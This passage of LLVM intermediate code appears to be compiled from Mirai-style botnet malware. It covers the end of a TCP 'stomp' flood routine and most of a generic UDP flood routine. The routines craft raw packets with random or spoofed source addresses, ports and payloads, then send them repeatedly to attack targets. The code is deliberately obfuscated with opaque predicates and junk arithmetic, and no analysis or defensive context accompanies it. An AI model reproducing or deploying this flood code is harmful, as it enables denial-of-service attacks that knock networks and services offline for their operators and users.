  %1194 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1193, i32 0, i32 2
  %1195 = load i32, i32* %1194, align 4
  %1196 = trunc i32 %1195 to i16
  %1197 = call zeroext i16 @htons(i16 zeroext %1196) #7
  %1198 = zext i16 %1197 to i32
  %1199 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1199, i32 0, i32 3
  store i32 %1198, i32* %1200, align 4
  %1201 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1201, i32 0, i32 6
  store i16 0, i16* %1202, align 4
  %1203 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1204 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1205 = bitcast %struct.tcphdr* %1204 to i8*
  %1206 = load i32, i32* %24, align 4
  %1207 = sext i32 %1206 to i64
  %_351 = sub i64 20, %1207
  %gen352 = mul i64 %_351, %1207
  %_353 = sub i64 0, 20
  %gen354 = add i64 %_353, %1207
  %_355 = sub i64 20, %1207
  %gen356 = mul i64 %_355, %1207
  %1208 = add i64 20, %1207
  %1209 = trunc i64 %1208 to i16
  %1210 = call zeroext i16 @htons(i16 zeroext %1209) #7
  %1211 = load i32, i32* %24, align 4
  %1212 = sext i32 %1211 to i64
  %_357 = sub i64 0, 20
  %gen358 = add i64 %_357, %1212
  %1213 = add i64 20, %1212
  %1214 = trunc i64 %1213 to i32
  %1215 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %1203, i8* %1205, i16 zeroext %1210, i32 %1214)
  %1216 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1216, i32 0, i32 6
  store i16 %1215, i16* %1217, align 4
  %1218 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1218, i32 0, i32 1
  %1220 = load i16, i16* %1219, align 2
  %1221 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %1222 = load i32, i32* %9, align 4
  %1223 = sext i32 %1222 to i64
  %1224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1221, i64 %1223
  %1225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1224, i32 0, i32 0
  %1226 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1225, i32 0, i32 1
  store i16 %1220, i16* %1226, align 2
  %1227 = load i32, i32* %10, align 4
  %1228 = load i8*, i8** %39, align 8
  %1229 = load i32, i32* %24, align 4
  %1230 = sext i32 %1229 to i64
  %_359 = sub i64 0, 40
  %gen360 = add i64 %_359, %1230
  %_361 = sub i64 40, %1230
  %gen362 = mul i64 %_361, %1230
  %_363 = shl i64 40, %1230
  %_364 = sub i64 40, %1230
  %gen365 = mul i64 %_364, %1230
  %_366 = sub i64 0, 40
  %gen367 = add i64 %_366, %1230
  %_368 = sub i64 40, %1230
  %gen369 = mul i64 %_368, %1230
  %_370 = shl i64 40, %1230
  %_371 = shl i64 40, %1230
  %1231 = add i64 40, %1230
  %1232 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %1233 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %1234 = load i32, i32* %9, align 4
  %1235 = sext i32 %1234 to i64
  %1236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1233, i64 %1235
  %1237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1236, i32 0, i32 0
  %1238 = bitcast %struct.sockaddr_in* %1237 to %struct.sockaddr*
  store %struct.sockaddr* %1238, %struct.sockaddr** %1232, align 8
  %1239 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %1240 = load %struct.sockaddr*, %struct.sockaddr** %1239, align 8
  %1241 = call i64 @sendto(i32 %1227, i8* %1228, i64 %1231, i32 16384, %struct.sockaddr* %1240, i32 16)
  br label %originalBB347

originalBB375alteredBB:                           ; preds = %originalBB375, %942
  br label %originalBB375
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %4
  %72 = load i32, i32* @x.31
  %73 = load i32, i32* @y.32
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %71
  store i16 1460, i16* %18, align 2
  %80 = load i32, i32* @x.31
  %81 = load i32, i32* @y.32
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %88

; <label>:88:                                     ; preds = %originalBBpart2, %4
  %89 = load i32, i32* @x.31
  %90 = load i32, i32* @y.32
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %97, i32* %10, align 4
  %98 = icmp eq i32 %97, -1
  %99 = load i32, i32* @x.31
  %100 = load i32, i32* @y.32
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %98, label %107, label %124

; <label>:107:                                    ; preds = %originalBBpart24
  %108 = load i32, i32* @x.31
  %109 = load i32, i32* @y.32
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %107
  %116 = load i32, i32* @x.31
  %117 = load i32, i32* @y.32
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %456

; <label>:124:                                    ; preds = %originalBBpart24
  store i32 1, i32* %9, align 4
  %125 = load i32, i32* %10, align 4
  %126 = bitcast i32* %9 to i8*
  %127 = call i32 @setsockopt(i32 %125, i32 0, i32 3, i8* %126, i32 4) #6
  %128 = icmp eq i32 %127, -1
  br i1 %128, label %129, label %132

; <label>:129:                                    ; preds = %124
  %130 = load i32, i32* %10, align 4
  %131 = call i32 @close(i32 %130)
  br label %456

; <label>:132:                                    ; preds = %124
  %133 = load i32, i32* @x.31
  %134 = load i32, i32* @y.32
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %132
  store i32 0, i32* %9, align 4
  %141 = load i32, i32* @x.31
  %142 = load i32, i32* @y.32
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %149

; <label>:149:                                    ; preds = %231, %originalBBpart212
  %150 = load i32, i32* %9, align 4
  %151 = load i8, i8* %5, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp slt i32 %150, %152
  br i1 %153, label %154, label %234

; <label>:154:                                    ; preds = %149
  %155 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %156 = load i8**, i8*** %11, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i8*, i8** %156, i64 %158
  store i8* %155, i8** %159, align 8
  %160 = load i8**, i8*** %11, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8*, i8** %160, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = bitcast i8* %164 to %struct.iphdr*
  store %struct.iphdr* %165, %struct.iphdr** %21, align 8
  %166 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i64 1
  %168 = bitcast %struct.iphdr* %167 to %struct.udphdr*
  store %struct.udphdr* %168, %struct.udphdr** %22, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = load i8, i8* %170, align 4
  %172 = and i8 %171, 15
  %173 = or i8 %172, 64
  store i8 %173, i8* %170, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %175 = bitcast %struct.iphdr* %174 to i8*
  %176 = load i8, i8* %175, align 4
  %177 = and i8 %176, -16
  %178 = or i8 %177, 5
  store i8 %178, i8* %175, align 4
  %179 = load i8, i8* %12, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 1
  store i8 %179, i8* %181, align 1
  %182 = load i16, i16* %18, align 2
  %183 = zext i16 %182 to i64
  %184 = add i64 28, %183
  %185 = trunc i64 %184 to i16
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 2
  store i16 %186, i16* %188, align 2
  %189 = load i16, i16* %13, align 2
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 3
  store i16 %190, i16* %192, align 4
  %193 = load i8, i8* %14, align 1
  %194 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 5
  store i8 %193, i8* %195, align 4
  %196 = load i8, i8* %15, align 1
  %197 = icmp ne i8 %196, 0
  br i1 %197, label %198, label %202

; <label>:198:                                    ; preds = %154
  %199 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 4
  store i16 %199, i16* %201, align 2
  br label %202

; <label>:202:                                    ; preds = %198, %154
  %203 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 6
  store i8 17, i8* %204, align 1
  %205 = load i32, i32* %20, align 4
  %206 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 8
  store i32 %205, i32* %207, align 4
  %208 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 1
  %213 = load i32, i32* %212, align 4
  %214 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 9
  store i32 %213, i32* %215, align 4
  %216 = load i16, i16* %16, align 2
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  store i16 %217, i16* %219, align 2
  %220 = load i16, i16* %17, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %223 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %222, i32 0, i32 1
  store i16 %221, i16* %223, align 2
  %224 = load i16, i16* %18, align 2
  %225 = zext i16 %224 to i64
  %226 = add i64 8, %225
  %227 = trunc i64 %226 to i16
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 2
  store i16 %228, i16* %230, align 2
  br label %231

; <label>:231:                                    ; preds = %202
  %232 = load i32, i32* %9, align 4
  %233 = add nsw i32 %232, 1
  store i32 %233, i32* %9, align 4
  br label %149

; <label>:234:                                    ; preds = %149
  br label %235

; <label>:235:                                    ; preds = %originalBBpart247, %234
  %236 = load i32, i32* @x.31
  %237 = load i32, i32* @y.32
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %235
  store i32 0, i32* %9, align 4
  %244 = load i32, i32* @x.31
  %245 = load i32, i32* @y.32
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %252

; <label>:252:                                    ; preds = %436, %originalBBpart216
  %253 = load i32, i32* %9, align 4
  %254 = load i8, i8* %5, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp slt i32 %253, %255
  br i1 %256, label %257, label %439

; <label>:257:                                    ; preds = %252
  %258 = load i32, i32* @x.31
  %259 = load i32, i32* @y.32
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %257
  %266 = load i8**, i8*** %11, align 8
  %267 = load i32, i32* %9, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds i8*, i8** %266, i64 %268
  %270 = load i8*, i8** %269, align 8
  store i8* %270, i8** %23, align 8
  %271 = load i8*, i8** %23, align 8
  %272 = bitcast i8* %271 to %struct.iphdr*
  store %struct.iphdr* %272, %struct.iphdr** %24, align 8
  %273 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i64 1
  %275 = bitcast %struct.iphdr* %274 to %struct.udphdr*
  store %struct.udphdr* %275, %struct.udphdr** %25, align 8
  %276 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i64 1
  %278 = bitcast %struct.udphdr* %277 to i8*
  store i8* %278, i8** %26, align 8
  %279 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %280 = load i32, i32* %9, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i64 %281
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %282, i32 0, i32 2
  %284 = load i8, i8* %283, align 4
  %285 = zext i8 %284 to i32
  %286 = icmp slt i32 %285, 32
  %287 = load i32, i32* @x.31
  %288 = load i32, i32* @y.32
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %286, label %295, label %316

; <label>:295:                                    ; preds = %originalBBpart220
  %296 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i32 0, i32 1
  %301 = load i32, i32* %300, align 4
  %302 = call i32 @ntohl(i32 %301) #7
  %303 = call i32 @rand_next()
  %304 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %305 = load i32, i32* %9, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i32 0, i32 2
  %309 = load i8, i8* %308, align 4
  %310 = zext i8 %309 to i32
  %311 = lshr i32 %303, %310
  %312 = add i32 %302, %311
  %313 = call i32 @htonl(i32 %312) #7
  %314 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 9
  store i32 %313, i32* %315, align 4
  br label %316

; <label>:316:                                    ; preds = %295, %originalBBpart220
  %317 = load i32, i32* %20, align 4
  %318 = icmp eq i32 %317, -1
  br i1 %318, label %319, label %323

; <label>:319:                                    ; preds = %316
  %320 = call i32 @rand_next()
  %321 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 8
  store i32 %320, i32* %322, align 4
  br label %323

; <label>:323:                                    ; preds = %319, %316
  %324 = load i16, i16* %13, align 2
  %325 = zext i16 %324 to i32
  %326 = icmp eq i32 %325, 65535
  br i1 %326, label %327, label %332

; <label>:327:                                    ; preds = %323
  %328 = call i32 @rand_next()
  %329 = trunc i32 %328 to i16
  %330 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 3
  store i16 %329, i16* %331, align 4
  br label %332

; <label>:332:                                    ; preds = %327, %323
  %333 = load i32, i32* @x.31
  %334 = load i32, i32* @y.32
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %332
  %341 = load i16, i16* %16, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  %344 = load i32, i32* @x.31
  %345 = load i32, i32* @y.32
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %343, label %352, label %357

; <label>:352:                                    ; preds = %originalBBpart224
  %353 = call i32 @rand_next()
  %354 = trunc i32 %353 to i16
  %355 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %356 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %355, i32 0, i32 0
  store i16 %354, i16* %356, align 2
  br label %357

; <label>:357:                                    ; preds = %352, %originalBBpart224
  %358 = load i16, i16* %17, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  br i1 %360, label %361, label %366

; <label>:361:                                    ; preds = %357
  %362 = call i32 @rand_next()
  %363 = trunc i32 %362 to i16
  %364 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %365 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %364, i32 0, i32 1
  store i16 %363, i16* %365, align 2
  br label %366

; <label>:366:                                    ; preds = %361, %357
  %367 = load i8, i8* %19, align 1
  %368 = icmp ne i8 %367, 0
  br i1 %368, label %369, label %373

; <label>:369:                                    ; preds = %366
  %370 = load i8*, i8** %26, align 8
  %371 = load i16, i16* %18, align 2
  %372 = zext i16 %371 to i32
  call void @rand_str(i8* %370, i32 %372)
  br label %373

; <label>:373:                                    ; preds = %369, %366
  %374 = load i32, i32* @x.31
  %375 = load i32, i32* @y.32
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %373
  %382 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 0, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %385 = bitcast %struct.iphdr* %384 to i16*
  %386 = call zeroext i16 @checksum_generic(i16* %385, i32 20)
  %387 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 7
  store i16 %386, i16* %388, align 2
  %389 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 3
  store i16 0, i16* %390, align 2
  %391 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %392 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %393 = bitcast %struct.udphdr* %392 to i8*
  %394 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 2
  %396 = load i16, i16* %395, align 2
  %397 = load i16, i16* %18, align 2
  %398 = zext i16 %397 to i64
  %399 = add i64 8, %398
  %400 = trunc i64 %399 to i32
  %401 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %391, i8* %393, i16 zeroext %396, i32 %400)
  %402 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 3
  store i16 %401, i16* %403, align 2
  %404 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 1
  %406 = load i16, i16* %405, align 2
  %407 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %408 = load i32, i32* %9, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i64 %409
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i32 0, i32 0
  %412 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %411, i32 0, i32 1
  store i16 %406, i16* %412, align 2
  %413 = load i32, i32* %10, align 4
  %414 = load i8*, i8** %23, align 8
  %415 = load i16, i16* %18, align 2
  %416 = zext i16 %415 to i64
  %417 = add i64 28, %416
  %418 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %419 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %420 = load i32, i32* %9, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i32 0, i32 0
  %424 = bitcast %struct.sockaddr_in* %423 to %struct.sockaddr*
  store %struct.sockaddr* %424, %struct.sockaddr** %418, align 8
  %425 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %426 = load %struct.sockaddr*, %struct.sockaddr** %425, align 8
  %427 = call i64 @sendto(i32 %413, i8* %414, i64 %417, i32 16384, %struct.sockaddr* %426, i32 16)
  %428 = load i32, i32* @x.31
  %429 = load i32, i32* @y.32
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart243, label %originalBB26alteredBB

originalBBpart243:                                ; preds = %originalBB26
  br label %436

; <label>:436:                                    ; preds = %originalBBpart243
  %437 = load i32, i32* %9, align 4
  %438 = add nsw i32 %437, 1
  store i32 %438, i32* %9, align 4
  br label %252

; <label>:439:                                    ; preds = %252
  %440 = load i32, i32* @x.31
  %441 = load i32, i32* @y.32
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %439
  %448 = load i32, i32* @x.31
  %449 = load i32, i32* @y.32
  %450 = sub i32 %448, 1
